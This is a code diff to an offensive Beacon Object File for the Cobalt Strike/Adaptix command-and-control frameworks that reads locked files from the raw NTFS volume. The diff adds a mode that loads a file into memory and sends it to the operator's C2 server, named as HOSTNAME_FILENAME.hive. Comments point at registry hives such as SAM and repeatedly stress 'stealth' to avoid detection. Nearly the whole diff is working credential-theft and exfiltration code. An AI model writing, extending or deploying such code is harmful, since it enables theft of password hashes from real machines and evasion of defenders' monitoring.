@@ -2,7 +2,12 @@
 #include <stdint.h>
 #include "../_include/beacon.h"
 #include "../_include/bofdefs.h"
+#include "../_include/adaptix.h"
 #include "underlaycopy.h"
+
+#ifndef MAX_COMPUTERNAME_LENGTH
+#define MAX_COMPUTERNAME_LENGTH 15
+#endif
 
 // Helper function to read NTFS boot sector (stealth mode - no logging)
 BOOL ReadNtfsBoot(HANDLE hVolume, NTFS_BOOT* boot) {
@@ -365,12 +370,233 @@ BOOL CopyFileByMft(HANDLE hVolume, HANDLE hOutput, FILE_INFO* fileInfo, NTFS_BOO
     return TRUE;
 }
 
+// Copy file by extents directly to memory buffer (for download to server)
+BOOL CopyFileByMftToMemory(HANDLE hVolume, FILE_INFO* fileInfo, NTFS_BOOT* boot, BYTE** outputBuffer, ULONGLONG* outputSize) {
+    ULONGLONG bytesCopied = 0;
+    BYTE* buffer = NULL;
+    DWORD bufferSize = 64 * 1024; // 64KB buffer
+    IO_STATUS_BLOCK ioStatus;
+    NTSTATUS status;
+    BYTE* resultBuffer = NULL;
+
+    *outputBuffer = NULL;
+    *outputSize = 0;
+
+    // Allocate output buffer
+    if (fileInfo->fileSize > 0x7FFFFFFF) {
+        BeaconPrintf(CALLBACK_ERROR, "[-] File too large: %llu bytes\n", fileInfo->fileSize);
+        return FALSE; // File too large
+    }
+    resultBuffer = (BYTE*)intAlloc((SIZE_T)fileInfo->fileSize);
+    if (!resultBuffer) {
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate buffer for file (%llu bytes)\n", fileInfo->fileSize);
+        return FALSE;
+    }
+
+    buffer = (BYTE*)intAlloc(bufferSize);
+    if (!buffer) {
+        intFree(resultBuffer);
+        return FALSE;
+    }
+
+    if (fileInfo->isResident) {
+        // Copy resident data directly
+        if (fileInfo->residentData && fileInfo->residentDataSize > 0) {
+            MSVCRT$memcpy(resultBuffer, fileInfo->residentData, fileInfo->residentDataSize);
+            bytesCopied = fileInfo->residentDataSize;
+        } else {
+            intFree(resultBuffer);
+            intFree(buffer);
+            return FALSE;
+        }
+    } else if (fileInfo->hasRuns && fileInfo->runCount > 0) {
+        // Copy non-resident data
+        int i;
+        for (i = 0; i < fileInfo->runCount; i++) {
+            ULONGLONG toRead = fileInfo->runs[i].length * boot->clusterSize;
+            ULONGLONG remaining = fileInfo->fileSize - bytesCopied;
+            if (toRead > remaining) {
+                toRead = remaining;
+            }
+            if (toRead == 0) {
+                break;
+            }
+
+            if (fileInfo->runs[i].lcn == 0) {
+                // Sparse cluster - write zeros
+                MSVCRT$memset(resultBuffer + bytesCopied, 0, (size_t)toRead);
+                bytesCopied += toRead;
+                continue;
+            }
+
+            ULONGLONG diskOffset = fileInfo->runs[i].lcn * boot->clusterSize;
+            LARGE_INTEGER readOffset;
+            readOffset.QuadPart = diskOffset;
+
+            ULONGLONG copied = 0;
+            while (copied < toRead) {
+                ULONG chunkSize = (ULONG)((toRead - copied > bufferSize) ? bufferSize : (toRead - copied));
+                
+                // Use NtReadFile for stealth
+                readOffset.QuadPart = diskOffset + copied;
+                status = NTDLL$NtReadFile(
+                    hVolume,
+                    NULL,
+                    NULL,
+                    NULL,
+                    &ioStatus,
+                    buffer,
+                    chunkSize,
+                    &readOffset,
+                    NULL
+                );
+                
+                if (!NT_SUCCESS(status) || ioStatus.Information == 0) {
+                    break;
+                }
+
+                // Copy to output buffer
+                MSVCRT$memcpy(resultBuffer + bytesCopied, buffer, ioStatus.Information);
+                copied += ioStatus.Information;
+                bytesCopied += ioStatus.Information;
+                
+                // Clear buffer after each read for stealth
+                MSVCRT$memset(buffer, 0, bufferSize);
+            }
+
+            if (bytesCopied >= fileInfo->fileSize) {
+                break;
+            }
+        }
+    } else {
+        // File has no data runs and is not resident - empty file or error
+        if (fileInfo->fileSize == 0) {
+            // Empty file is valid
+            bytesCopied = 0;
+        } else {
+            // Error: file has size but no data
+            BeaconPrintf(CALLBACK_ERROR, "[-] File has size (%llu) but no data (not resident, no runs)\n", fileInfo->fileSize);
+            intFree(resultBuffer);
+            intFree(buffer);
+            return FALSE;
+        }
+    }
+
+    // Clear buffer before freeing
+    MSVCRT$memset(buffer, 0, bufferSize);
+    intFree(buffer);
+
+    if (bytesCopied == fileInfo->fileSize) {
+        *outputBuffer = resultBuffer;
+        *outputSize = bytesCopied;
+        return TRUE;
+    } else {
+        intFree(resultBuffer);
+        return FALSE;
+    }
+}
+
+// Download file to server using Adaptix API
+// Format: HOSTNAME_FILENAME.hive
+BOOL download_file(IN LPCSTR sourcePath, IN LPCSTR customFileName, IN char* fileData, IN ULONG32 fileLength) {
+    if (!fileData || fileLength == 0) {
+        return FALSE;
+    }
+    
+    // Get hostname
+    DWORD hostnameSize = MAX_COMPUTERNAME_LENGTH + 1;
+    char* hostname = (char*)intAlloc(hostnameSize);
+    if (!hostname) {
+        return FALSE;
+    }
+    
+    if (!KERNEL32$GetComputerNameA(hostname, &hostnameSize)) {
+        intFree(hostname);
+        return FALSE;
+    }
+    
+    // Extract filename from source path or use custom filename
+    char* fileName = NULL;
+    BOOL needFreeFileName = FALSE;
+    
+    if (customFileName && MSVCRT$strlen(customFileName) > 0) {
+        // Extract filename from custom path (e.g., ".\SAM2" -> "SAM2")
+        char* lastSlash = MSVCRT$strrchr(customFileName, '\\');
+        if (!lastSlash) {
+            lastSlash = MSVCRT$strrchr(customFileName, '/');
+        }
+        
+        const char* fileNamePtr = lastSlash ? (lastSlash + 1) : customFileName;
+        int fileNameLen = MSVCRT$strlen(fileNamePtr) + 1;
+        fileName = (char*)intAlloc(fileNameLen);
+        if (!fileName) {
+            intFree(hostname);
+            return FALSE;
+        }
+        MSVCRT$strcpy(fileName, fileNamePtr);
+        needFreeFileName = TRUE;
+    } else if (sourcePath) {
+        // Extract filename from source path
+        char* lastSlash = MSVCRT$strrchr(sourcePath, '\\');
+        if (!lastSlash) {
+            lastSlash = MSVCRT$strrchr(sourcePath, '/');
+        }
+        
+        const char* fileNamePtr = lastSlash ? (lastSlash + 1) : sourcePath;
+        int fileNameLen = MSVCRT$strlen(fileNamePtr) + 1;
+        fileName = (char*)intAlloc(fileNameLen);
+        if (!fileName) {
+            intFree(hostname);
+            return FALSE;
+        }
+        MSVCRT$strcpy(fileName, fileNamePtr);
+        needFreeFileName = TRUE;
+    } else {
+        intFree(hostname);
+        return FALSE;
+    }
+    
+    // Remove extension from filename if present
+    char* fileExt = MSVCRT$strrchr(fileName, '.');
+    int baseNameLen = fileExt ? (fileExt - fileName) : MSVCRT$strlen(fileName);
+    
+    // Allocate buffer for final filename: HOSTNAME_FILENAME.hive
+    int finalNameLen = hostnameSize + baseNameLen + 6; // +6 for "_" and ".hive\0"
+    char* finalFileName = (char*)intAlloc(finalNameLen);
+    if (!finalFileName) {
+        if (needFreeFileName) {
+            intFree(fileName);
+        }
+        intFree(hostname);
+        return FALSE;
+    }
+    
+    // Build filename: HOSTNAME_FILENAME.hive
+    MSVCRT$sprintf(finalFileName, "%.*s_%.*s.hive", 
+        (int)hostnameSize, hostname,
+        baseNameLen, fileName);
+    
+    // Download to server
+    AxDownloadMemory(finalFileName, fileData, (int)fileLength);
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] File downloaded to server: %s (%lu bytes)\n", finalFileName, fileLength);
+    
+    // Cleanup
+    intFree(finalFileName);
+    if (needFreeFileName) {
+        intFree(fileName);
+    }
+    intFree(hostname);
+    
+    return TRUE;
+}
+
 // Main function
 void go(char* args, int len) {
     datap parser;
     char* mode = NULL;
     char* sourceFile = NULL;
     char* destFile = NULL;
+    int downloadToServer = 0;  // 0 = write to disk, 1 = download to server
     WCHAR* sourceFileW = NULL;
     WCHAR* destFileW = NULL;
     HANDLE hVolume = INVALID_HANDLE_VALUE;
@@ -381,24 +607,53 @@ void go(char* args, int len) {
     ULONGLONG mftRecordNumber = 0;
     ULONGLONG fileSize = 0;
     BOOL success = FALSE;
+    BYTE* fileBuffer = NULL;  // Buffer for file data when downloading to server
 
     BeaconDataParse(&parser, args, len);
     mode = BeaconDataExtract(&parser, NULL);
     sourceFile = BeaconDataExtract(&parser, NULL);
     destFile = BeaconDataExtract(&parser, NULL);
+    downloadToServer = BeaconDataInt(&parser);
 
-    if (!mode || !sourceFile || !destFile) {
+    if (!mode || !sourceFile) {
+        return;
+    }
+    
+    // Check if destFile is empty string (when --download is used without destination)
+    if (destFile && MSVCRT$strlen(destFile) == 0) {
+        destFile = NULL;
+    }
+    
+    // If downloading to server, destFile is optional (used as filename on server)
+    // If saving to disk, destFile is required
+    if (!downloadToServer && !destFile) {
         return;
     }
 
     // Convert to wide char
     int sourceLen = MSVCRT$strlen(sourceFile) + 1;
-    int destLen = MSVCRT$strlen(destFile) + 1;
     sourceFileW = (WCHAR*)intAlloc(sourceLen * sizeof(WCHAR));
-    destFileW = (WCHAR*)intAlloc(destLen * sizeof(WCHAR));
-
     KERNEL32$MultiByteToWideChar(CP_ACP, 0, sourceFile, -1, sourceFileW, sourceLen);
-    KERNEL32$MultiByteToWideChar(CP_ACP, 0, destFile, -1, destFileW, destLen);
+    
+    if (destFile) {
+        int destLen = MSVCRT$strlen(destFile) + 1;
+        destFileW = (WCHAR*)intAlloc(destLen * sizeof(WCHAR));
+        KERNEL32$MultiByteToWideChar(CP_ACP, 0, destFile, -1, destFileW, destLen);
+    } else if (downloadToServer) {
+        // Generate default filename from source if not provided
+        char* fileName = MSVCRT$strrchr(sourceFile, '\\');
+        if (!fileName) {
+            fileName = MSVCRT$strrchr(sourceFile, '/');
+        }
+        if (fileName) {
+            fileName++;  // Skip the separator
+        } else {
+            fileName = sourceFile;
+        }
+        int destLen = MSVCRT$strlen(fileName) + 1;
+        destFileW = (WCHAR*)intAlloc(destLen * sizeof(WCHAR));
+        KERNEL32$MultiByteToWideChar(CP_ACP, 0, fileName, -1, destFileW, destLen);
+    }
 
     // Open volume using NtCreateFile for stealth (hardcoded to C: for now)
     OBJECT_ATTRIBUTES objAttr;
@@ -459,92 +714,119 @@ void go(char* args, int len) {
             goto cleanup;
         }
 
+        // Initialize fileSize before parsing (will be overwritten if $DATA found)
+        fileInfo.fileSize = fileSize;
+        
         if (!GetFileInfoFromRecord(mftRecord, &fileInfo, &boot)) {
             BeaconPrintf(CALLBACK_ERROR, "[-] Failed to parse file info from MFT record\n");
             goto cleanup;
         }
 
-        fileInfo.fileSize = fileSize; // Use actual file size
-
-        // Create output file using NtCreateFile for stealth
-        // First, get full path
-        WCHAR fullDestPath[MAX_PATH * 2];
-        WCHAR* filePart = NULL;
-        DWORD fullPathLen = KERNEL32$GetFullPathNameW(destFileW, MAX_PATH * 2, fullDestPath, &filePart);
+        // Use actual file size from GetNtfsFileInfo (more reliable)
+        fileInfo.fileSize = fileSize;
         
-        if (fullPathLen == 0 || fullPathLen >= MAX_PATH * 2) {
-            // Fallback to original path if GetFullPathNameW fails
-            fullPathLen = KERNEL32$lstrlenW(destFileW);
-            MSVCRT$memcpy(fullDestPath, destFileW, (fullPathLen + 1) * sizeof(WCHAR));
-        }
-        
-        // Normalize path with \??\ prefix for NtCreateFile (not \\?\)
-        WCHAR normalizedDestPath[MAX_PATH * 2];
-        int destPathLen = fullPathLen;
-        
-        // Check if already has \??\ or \\?\ prefix
-        if ((fullDestPath[0] == L'\\' && fullDestPath[1] == L'\\' && fullDestPath[2] == L'?' && fullDestPath[3] == L'\\') ||
-            (fullDestPath[0] == L'\\' && fullDestPath[1] == L'?' && fullDestPath[2] == L'?' && fullDestPath[3] == L'\\')) {
-            // Already normalized, but convert \\?\ to \??\ if needed
-            if (fullDestPath[1] == L'\\') {
+        if (downloadToServer) {
+            // Copy file directly to memory for download (no disk write)
+            ULONGLONG copiedSize = 0;
+            if (!CopyFileByMftToMemory(hVolume, &fileInfo, &boot, &fileBuffer, &copiedSize)) {
+                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to copy file data to memory\n");
+                goto cleanup;
+            }
+            
+            // Close output file handle (we don't need it anymore)
+            if (hOutput != INVALID_HANDLE_VALUE) {
+                NTDLL$NtClose(hOutput);
+                hOutput = INVALID_HANDLE_VALUE;
+            }
+            
+            // Download to server with format: HOSTNAME_FILENAME.hive
+            if (download_file(sourceFile, destFile, (char*)fileBuffer, (ULONG32)copiedSize)) {
+                success = TRUE;
+                BeaconPrintf(CALLBACK_OUTPUT, "[+] File copied and downloaded to server: %llu bytes\n", copiedSize);
+            } else {
+                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to download file to server\n");
+            }
+        } else {
+            // Create output file using NtCreateFile for stealth
+            // First, get full path
+            WCHAR fullDestPath[MAX_PATH * 2];
+            WCHAR* filePart = NULL;
+            DWORD fullPathLen = KERNEL32$GetFullPathNameW(destFileW, MAX_PATH * 2, fullDestPath, &filePart);
+            
+            if (fullPathLen == 0 || fullPathLen >= MAX_PATH * 2) {
+                // Fallback to original path if GetFullPathNameW fails
+                fullPathLen = KERNEL32$lstrlenW(destFileW);
+                MSVCRT$memcpy(fullDestPath, destFileW, (fullPathLen + 1) * sizeof(WCHAR));
+            }
+            
+            // Normalize path with \??\ prefix for NtCreateFile (not \\?\)
+            WCHAR normalizedDestPath[MAX_PATH * 2];
+            int destPathLen = fullPathLen;
+            
+            // Check if already has \??\ or \\?\ prefix
+            if ((fullDestPath[0] == L'\\' && fullDestPath[1] == L'\\' && fullDestPath[2] == L'?' && fullDestPath[3] == L'\\') ||
+                (fullDestPath[0] == L'\\' && fullDestPath[1] == L'?' && fullDestPath[2] == L'?' && fullDestPath[3] == L'\\')) {
+                // Already normalized, but convert \\?\ to \??\ if needed
+                if (fullDestPath[1] == L'\\') {
+                    normalizedDestPath[0] = L'\\';
+                    normalizedDestPath[1] = L'?';
+                    normalizedDestPath[2] = L'?';
+                    normalizedDestPath[3] = L'\\';
+                    MSVCRT$memcpy(normalizedDestPath + 4, fullDestPath + 4, (destPathLen - 3) * sizeof(WCHAR));
+                } else {
+                    MSVCRT$memcpy(normalizedDestPath, fullDestPath, (destPathLen + 1) * sizeof(WCHAR));
+                }
+            } else {
+                // Add \??\ prefix
                 normalizedDestPath[0] = L'\\';
                 normalizedDestPath[1] = L'?';
                 normalizedDestPath[2] = L'?';
                 normalizedDestPath[3] = L'\\';
-                MSVCRT$memcpy(normalizedDestPath + 4, fullDestPath + 4, (destPathLen - 3) * sizeof(WCHAR));
-            } else {
-                MSVCRT$memcpy(normalizedDestPath, fullDestPath, (destPathLen + 1) * sizeof(WCHAR));
+                MSVCRT$memcpy(normalizedDestPath + 4, fullDestPath, (destPathLen + 1) * sizeof(WCHAR));
+                destPathLen += 4;
             }
-        } else {
-            // Add \??\ prefix
-            normalizedDestPath[0] = L'\\';
-            normalizedDestPath[1] = L'?';
-            normalizedDestPath[2] = L'?';
-            normalizedDestPath[3] = L'\\';
-            MSVCRT$memcpy(normalizedDestPath + 4, fullDestPath, (destPathLen + 1) * sizeof(WCHAR));
-            destPathLen += 4;
-        }
-        
-        OBJECT_ATTRIBUTES objAttr;
-        UNICODE_STRING outputPath;
-        IO_STATUS_BLOCK ioStatus;
-        
-        // Use RtlInitUnicodeString for proper initialization
-        NTDLL$RtlInitUnicodeString(&outputPath, normalizedDestPath);
-        
-        objAttr.Length = sizeof(OBJECT_ATTRIBUTES);
-        objAttr.RootDirectory = NULL;
-        objAttr.ObjectName = &outputPath;
-        objAttr.Attributes = OBJ_CASE_INSENSITIVE;
-        objAttr.SecurityDescriptor = NULL;
-        objAttr.SecurityQualityOfService = NULL;
-        
-        status = NTDLL$NtCreateFile(
-            &hOutput,
-            FILE_WRITE_DATA | SYNCHRONIZE,
-            &objAttr,
-            &ioStatus,
-            NULL,
-            FILE_ATTRIBUTE_NORMAL,
-            0,
-            FILE_OVERWRITE_IF,
-            FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
-            NULL,
-            0
-        );
+            
+            OBJECT_ATTRIBUTES objAttr;
+            UNICODE_STRING outputPath;
+            IO_STATUS_BLOCK ioStatus;
+            
+            // Use RtlInitUnicodeString for proper initialization
+            NTDLL$RtlInitUnicodeString(&outputPath, normalizedDestPath);
+            
+            objAttr.Length = sizeof(OBJECT_ATTRIBUTES);
+            objAttr.RootDirectory = NULL;
+            objAttr.ObjectName = &outputPath;
+            objAttr.Attributes = OBJ_CASE_INSENSITIVE;
+            objAttr.SecurityDescriptor = NULL;
+            objAttr.SecurityQualityOfService = NULL;
+            
+            status = NTDLL$NtCreateFile(
+                &hOutput,
+                FILE_WRITE_DATA | SYNCHRONIZE,
+                &objAttr,
+                &ioStatus,
+                NULL,
+                FILE_ATTRIBUTE_NORMAL,
+                0,
+                FILE_OVERWRITE_IF,
+                FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
+                NULL,
+                0
+            );
 
-        if (!NT_SUCCESS(status)) {
-            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to create output file: 0x%08X\n", status);
-            goto cleanup;
-        }
+            if (!NT_SUCCESS(status)) {
+                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to create output file: 0x%08X\n", status);
+                goto cleanup;
+            }
+            
+            if (!CopyFileByMft(hVolume, hOutput, &fileInfo, &boot)) {
+                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to copy file data\n");
+                goto cleanup;
+            }
 
-        if (!CopyFileByMft(hVolume, hOutput, &fileInfo, &boot)) {
-            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to copy file data\n");
-            goto cleanup;
+            success = TRUE;
+            BeaconPrintf(CALLBACK_OUTPUT, "[+] File copied successfully: %llu bytes\n", fileSize);
         }
-
-        success = TRUE;
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] File copied successfully: %llu bytes\n", fileSize);
     }
 
 cleanup:
@@ -574,8 +856,14 @@ cleanup:
         intFree(sourceFileW);
     }
     if (destFileW) {
+        int destLen = KERNEL32$lstrlenW(destFileW) + 1;
         MSVCRT$memset(destFileW, 0, destLen * sizeof(WCHAR));
         intFree(destFileW);
+    }
+    
+    if (fileBuffer) {
+        MSVCRT$memset(fileBuffer, 0, (SIZE_T)fileSize);
+        intFree(fileBuffer);
     }
     
     // Clear sensitive data from stack
